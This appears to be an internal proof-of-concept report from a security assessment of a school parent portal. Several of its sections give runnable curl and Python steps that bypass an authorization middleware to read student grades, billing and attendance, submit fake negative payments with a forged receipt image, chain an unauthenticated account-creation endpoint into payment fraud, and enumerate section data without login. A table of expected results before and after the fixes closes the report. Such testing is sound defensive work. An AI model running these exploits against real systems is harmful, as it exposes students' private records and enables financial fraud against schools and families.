# Parent Portal — Proof of Concept (PoC)
**Date:** June 08, 2026  
**Classification:** Internal — Restricted  
**Purpose:** Demonstrate exploitability of confirmed vulnerabilities

> **Usage Policy:** These PoCs are for internal assessment purposes only. Replace `http://app.local` with the actual application URL. Do not run against production without written authorization.

---

## PoC-P-01 — Student Bypasses isParent Middleware on Data Endpoints

**Finding:** P-01 (HIGH)  
**Routes:** All `/parent/enrollment/*`  
**Prerequisite:** Any valid student login (type=7)

### Step 1 — Login as a Student
```bash
# Get CSRF token
TOKEN=$(curl -s "http://app.local/login" | grep -oP 'name="_token" value="\K[^"]*')

# Login as student
curl -s -c cookies.txt -b cookies.txt \
  -X POST "http://app.local/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "_token=$TOKEN" \
  --data-urlencode "email=S1001" \
  --data-urlencode "password=<student_password>"
```

### Step 2 — Access Parent-Only Grade Endpoint (No isParent Check)
```bash
# Access grades as student through parent endpoint
# Should return 403 but returns grade data instead
curl -s -b cookies.txt "http://app.local/parent/enrollment/record/grades?syid=1&semid=1&sectionid=5&levelid=8"
# Expected: JSON grade data — isParent middleware completely bypassed
```

### Step 3 — Access Billing and Ledger
```bash
# Get billing summary through parent endpoint
curl -s -b cookies.txt "http://app.local/parent/enrollment/billing?syid=1&semid=1"

# Get full payment ledger
curl -s -b cookies.txt "http://app.local/parent/enrollment/ledger?syid=1&semid=1"

# Get previous balance
curl -s -b cookies.txt "http://app.local/parent/enrollment/previousbalance?syid=1&semid=1"
```

### Step 4 — Access Attendance Records
```bash
curl -s -b cookies.txt "http://app.local/parent/enrollment/record/attendance?syid=1"
```

**Expected result (before fix):** Full JSON data returned for all endpoints — same data the parent portal fetches  
**Expected result (after fix):** `302 /login` or `403 Forbidden`

**Verification (database):** No changes to DB — this is a read-only bypass

---

## PoC-P-02 — Fake Online Payment Submission

**Finding:** P-02 + P-03 (HIGH + MEDIUM)  
**Route:** `POST /parentEnterAmount`  
**Prerequisite:** Any session with `studentInfo` (student or parent login)

### Standard Fake Payment
```bash
# Using a student session from PoC-P-01

# Create a minimal valid receipt image (1x1 pixel JPEG)
python3 -c "
import base64, sys
# Minimal valid JPEG bytes
jpeg = bytes([0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01,
              0x01,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0xFF,0xDB,0x00,0x43,
              0x00,0x08,0x06,0x06,0x07,0x06,0x05,0x08,0x07,0x07,0x07,0x09,
              0x09,0x08,0x0A,0x0C,0x14,0x0D,0x0C,0x0B,0x0B,0x0C,0x19,0x12,
              0x13,0x0F,0x14,0x1D,0x1A,0x1F,0x1E,0x1D,0x1A,0x1C,0x1C,0x20,
              0x24,0x2E,0x27,0x20,0x22,0x2C,0x23,0x1C,0x1C,0x28,0x37,0x29,
              0x2C,0x30,0x31,0x34,0x34,0x34,0x1F,0x27,0x39,0x3D,0x38,0x32,
              0x3C,0x2E,0x33,0x34,0x32,0xFF,0xC0,0x00,0x0B,0x08,0x00,0x01,
              0x00,0x01,0x01,0x01,0x11,0x00,0xFF,0xC4,0x00,0x1F,0x00,0x00,
              0x01,0x05,0x01,0x01,0x01,0x01,0x01,0x01,0x00,0x00,0x00,0x00,
              0x00,0x00,0x00,0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,
              0x09,0x0A,0x0B,0xFF,0xC4,0x00,0xB5,0x10,0x00,0x02,0x01,0x03,
              0x03,0x02,0x04,0x03,0x05,0x05,0x04,0x04,0x00,0x00,0x01,0x7D,
              0xFF,0xDA,0x00,0x08,0x01,0x01,0x00,0x00,0x3F,0x00,0xFB,0xFF,
              0xD9])
with open('/tmp/receipt.jpg','wb') as f: f.write(jpeg)
"

# Submit payment with negative amount — no validation on amount
curl -s -b cookies.txt \
  -X POST "http://app.local/parentEnterAmount" \
  -F "paymentType=1" \
  -F "recieptImage=@/tmp/receipt.jpg" \
  -F "amount=-5000" \
  -F "studid=1001" \
  -F "refNum=FAKE-$(date +%s)" \
  -F "transDate=2026-06-11" \
  -F "_token=<CSRF>"

# Expected: [{"status":"1","message":"SUCCESS"}]
# Record inserted into onlinepayments with amount=-5000
```

### Negative Amount Impact
```sql
-- Verify the record was inserted
SELECT id, queingcode, amount, refNum, isapproved FROM onlinepayments ORDER BY id DESC LIMIT 5;
-- Expected: New row with amount=-5000, isapproved=0 (pending finance approval)
```

### Zero Amount Submission
```bash
curl -s -b cookies.txt \
  -X POST "http://app.local/parentEnterAmount" \
  -F "paymentType=1" \
  -F "recieptImage=@/tmp/receipt.jpg" \
  -F "amount=0" \
  -F "studid=1001" \
  -F "refNum=ZERO-$(date +%s)" \
  -F "transDate=2026-06-11" \
  -F "_token=<CSRF>"
# Expected: Accepted — zero amount record created
```

---

## PoC-P-03 — Combined Registrar + Parent Chain (Account Creation → Payment Fraud)

**Findings:** R-01 + P-02 + P-03  
**Complexity:** Low  
**Prerequisites:** None (starts from unauthenticated)

```bash
# Step 1: Create parent accounts (Registrar R-01 — no auth required)
curl -s "http://app.local/fixAccountConflict"
# → Parent account P1001 created with password=123456

# Step 2: Login as the parent
TOKEN=$(curl -s "http://app.local/login" | grep -oP 'name="_token" value="\K[^"]*')
curl -s -c chain_cookies.txt -b chain_cookies.txt \
  -X POST "http://app.local/login" \
  --data-urlencode "_token=$TOKEN" \
  --data-urlencode "email=P1001" \
  --data-urlencode "password=123456"

# Step 3: View student's full billing ledger
curl -s -b chain_cookies.txt "http://app.local/parent/enrollment/ledger?syid=1&semid=1"
# → Full payment history returned

# Step 4: Submit a fraudulent negative payment
curl -s -b chain_cookies.txt \
  -X POST "http://app.local/parentEnterAmount" \
  -F "paymentType=1" \
  -F "recieptImage=@/tmp/receipt.jpg" \
  -F "amount=-10000" \
  -F "studid=1001" \
  -F "refNum=CHAIN-FRAUD-$(date +%s)" \
  -F "transDate=2026-06-11" \
  -F "_token=<CSRF>"

echo "Complete: Unauthenticated → Parent account → Billing view → Fraudulent payment"
```

---

## PoC-P-04 — Unauthenticated Section Data Enumeration

**Finding:** P-05 (LOW)  
**Route:** `GET /testingesayloading`  
**Middleware:** None

```bash
# No login required
curl -s "http://app.local/testingesayloading"
# Returns: JSON array of all school sections with room assignments
# Useful for reconnaissance before attacking grade endpoints (College C-01 chain)
```

---

## Summary of PoC Results

| PoC | Expected Before Fix | Expected After Fix |
|---|---|---|
| PoC-P-01 (student → parent endpoint) | Full grade/billing JSON returned | `302 /login` — route now inside `['auth','isParent']` |
| PoC-P-02 (fake payment) | `{"status":"1","message":"SUCCESS"}` | `302 /login` — route now inside `['auth','isParent']` |
| PoC-P-02 (negative amount) | `-5000` inserted into DB | `422` — validator rejects `amount < 1` |
| PoC-P-03 (chain) | Full chain succeeds | Blocked at Step 1 (R-01 fix) or Step 4 (P-02 fix) |
| PoC-P-04 (section dump) | JSON section list | `302 /login` — route removed or gated |

---

*End of Parent Portal PoC Document*
